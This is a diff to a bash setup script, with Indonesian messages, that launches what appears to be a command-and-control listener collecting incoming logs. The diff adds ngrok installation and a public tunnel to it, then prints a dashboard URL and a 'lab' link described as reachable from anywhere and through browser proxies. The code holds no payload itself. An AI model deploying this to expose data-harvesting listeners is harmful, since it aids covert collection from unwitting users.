@@ -4,6 +4,8 @@ PORT=8080
 LOG_DIR="./received_logs"
 SCRIPT_NAME="c2_listener.py"
 SERVER_LOG="c2_server.log"
+NGROK_AUTH_TOKEN="${NGROK_AUTH_TOKEN:-}"
+NGROK_PORT="${NGROK_PORT:-8080}"
 
 if [ "$(id -u)" -eq 0 ]; then
     SUDO=""
@@ -426,6 +428,40 @@ open_port() {
 }
 open_port
 
+setup_ngrok() {
+    if ! command -v ngrok > /dev/null 2>&1; then
+        echo " [*] ngrok belum terpasang, memasang via apt..."
+        if command -v apt-get > /dev/null 2>&1; then
+            curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | $SUDO tee /etc/apt/trusted.gpg.d/ngrok.asc > /dev/null 2>&1 || true
+            echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | $SUDO tee /etc/apt/sources.list.d/ngrok.list > /dev/null 2>&1 || true
+            $SUDO apt-get update > /dev/null 2>&1 || true
+            $SUDO apt-get install -y ngrok > /dev/null 2>&1 || echo " [!] Gagal install ngrok via apt."
+        fi
+    fi
+    if ! command -v ngrok > /dev/null 2>&1; then
+        echo " [!] Install ngrok manual: https://ngrok.com/download, lalu jalankan ulang."
+        return 0
+    fi
+    ngrok config add-authtoken "$NGROK_AUTH_TOKEN" > /dev/null 2>&1 || true
+    echo " [*] Starting ngrok tunnel -> localhost:$NGROK_PORT ..."
+    nohup ngrok http "$NGROK_PORT" --log=stdout > ngrok.log 2>&1 &
+    NGROK_PID=$!
+    sleep 4
+    NGROK_URL=""
+    for i in 1 2 3 4 5 6; do
+        NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | python3 -c "import sys,json;print(json.load(sys.stdin)['tunnels'][0]['public_url'])" 2>/dev/null || true)
+        if [ -n "$NGROK_URL" ]; then
+            break
+        fi
+        sleep 2
+    done
+    if [ -n "$NGROK_URL" ]; then
+        echo " [+] Ngrok tunnel berjalan (PID $NGROK_PID): $NGROK_URL"
+    else
+        echo " [!] Ngrok tidak menghasilkan public URL. Cek: tail -f ngrok.log"
+    fi
+}
+
 echo " [*] Detecting server IP..."
 TS_IP=""
 detect_ip() {
@@ -483,3 +519,24 @@ if kill -0 "$LISTENER_PID" 2>/dev/null; then
 else
     echo " [!] Listener gagal start, cek log: $SERVER_LOG"
 fi
+
+NGROK_URL=""
+if [ -n "$NGROK_AUTH_TOKEN" ]; then
+    setup_ngrok
+else
+    echo " [!] NGROK_AUTH_TOKEN kosong -> ngrok dilewati."
+    echo "     Daftar gratis di https://dashboard.ngrok.com lalu jalankan ulang:"
+    echo "     NGROK_AUTH_TOKEN=TOKEN_ANDA bash main.sh"
+fi
+
+echo ""
+echo "=================================================================="
+echo " URL AKHIR"
+if [ -n "$NGROK_URL" ]; then
+    echo " [NGROK] Dashboard : $NGROK_URL/dashboard"
+    echo " [NGROK] Link lab  : $NGROK_URL/?id=lab-1"
+    echo "         (bisa dibuka dari mana saja / tembus proxy browser)"
+fi
+echo " [LAN]  Dashboard : http://${SERVER_IP}:${PORT}/dashboard"
+echo " [LAN]  Link lab  : http://${SERVER_IP}:${PORT}/?id=lab-1"
+echo "=================================================================="
